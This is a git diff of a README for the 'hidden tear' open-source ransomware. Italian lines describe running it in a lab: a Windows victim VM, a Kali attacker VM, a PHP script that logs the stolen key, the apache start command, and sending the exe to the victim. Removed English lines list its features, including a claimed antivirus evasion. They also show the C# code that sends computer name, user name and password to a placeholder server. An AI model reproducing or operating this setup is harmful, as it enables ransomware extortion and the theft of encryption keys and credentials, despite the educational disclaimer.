@@ -1,3 +1,5 @@
+Copia dello storico ransomeware open source:
+
          _     _     _     _              _                  
         | |   (_)   | |   | |            | |                 
         | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
@@ -5,39 +7,35 @@
         | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
         |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|   
                                                      
-It's a ransomware-like file crypter sample which can be modified for specific purposes. 
+                                                     
+Per utilizzarlo mi sono servito di due macchine virtuali: una con windows 10 che fungeva da vittima e una con kali linux che faceva da attaccante.
 
-**Features**
-* Uses AES algorithm to encrypt files.
-* Sends encryption key to a server.
-* Encrypted files can be decrypt in decrypter program with encryption key.
-* Creates a text file in Desktop with given message.
-* Small file size (12 KB)
-* Doesn't detected to antivirus programs (15/08/2015) http://nodistribute.com/result/6a4jDwi83Fzt
+A riga 40 del file ho aggiunto l'indirizzo IP della macchina con kali linux
 
-**Demonstration Video**
+Nella macchina con kali linux nella cartella var/www/html ho creato un file data.txt e un file keys.php, in quest'ultimo ho inserito questo codice:
 
-https://www.youtube.com/watch?v=LtiRISepIfs
-
-**Usage**
-
-* You need to have a web server which supports scripting languages like php,python etc. Change this line with your URL. (You better use Https connection to avoid eavesdropping)
-
-  `string targetURL = "https://www.example.com/hidden-tear/write.php?info=";`
-
-* The script should writes the GET parameter to a text file. Sending process running in `SendPassword()` function
-
-  ```
-  string info = computerName + "-" + userName + " " + password;
-  var fullUrl = targetURL + info;
-  var conent = new System.Net.WebClient().DownloadString(fullUrl);
-  
-  ```
-* Target file extensions can be change. Default list:
 
 ```
-var validExtensions = new[]{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
+ <?php
+	$info = $_GET['info'];
+	$file = fopen("data.txt", "a");
+	fwrite($file, $info."". PHP_EOL);
+	fclose($file);
+	?>
+         
 ```
+ 
+ poi ho aperto un terminale nella stessa cartella e ho lanciato:
+```
+service apache2 start                                                                           
+```
+
+[Riferimento video](https://www.youtube.com/watch?v=ILlTB0-xT-k&t=387s)
+
+
+Alla macchina 'vittima' ho inviato i file exe hidden tear e il decripter contenuti nella cartella bin
 **Legal Warning** 
 
 While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
+
+Anche se questo può essere utile per alcuni, ci sono rischi significativi. Può essere utilizzato solo per scopi educativi. Non usarlo come ransomware! Potresti finire in prigione con l'accusa di ostruzione alla giustizia, anche se sei innocente.
